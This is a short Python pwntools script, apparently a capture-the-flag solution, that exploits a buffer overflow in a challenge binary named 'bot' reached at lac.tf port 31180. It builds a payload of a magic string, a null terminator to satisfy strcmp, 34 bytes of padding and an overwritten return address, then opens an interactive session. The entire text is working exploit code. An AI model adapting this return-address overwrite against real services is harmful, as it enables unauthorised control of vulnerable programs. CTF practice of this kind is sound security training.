from pwn import *

#p = process("./bot")
p = remote("lac.tf", 31180)

payload = b"please please please give me the flag"
payload += b"\x00" # string terminate for strcmp
payload += b"A"*34 # offset after initial string
payload += p64(0x40128e)

p.recvline()
p.sendline(payload)

p.interactive()